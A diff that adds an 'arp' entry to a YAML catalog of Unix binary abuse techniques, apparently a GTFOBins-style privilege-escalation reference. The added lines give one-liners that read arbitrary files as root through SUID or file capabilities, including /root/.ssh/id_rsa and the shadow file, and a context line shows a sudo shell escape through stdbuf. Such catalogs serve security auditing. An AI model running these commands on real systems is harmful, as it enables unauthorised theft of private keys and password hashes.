@@ -321,3 +321,9 @@
 - bin: stdbuf
   functions:
     - {func: sudo, code: "sudo stdbuf -i0 /bin/sh"}
+
+- bin: arp
+  functions:
+    - {func: file-read, code: "arp -v -f /root/.ssh/id_rsa  # SUID/cap_dac_read_search+ep or empty-caps: unparseable lines are echoed as warnings -> read any file as root"}
+    - {func: suid, code: "arp -v -f file_to_read  # SUID -> arbitrary file read (id_rsa/shadow)"}
+    - {func: capabilities, code: "arp -v -f file_to_read  # cap_dac_read_search+ep -> arbitrary file read"}
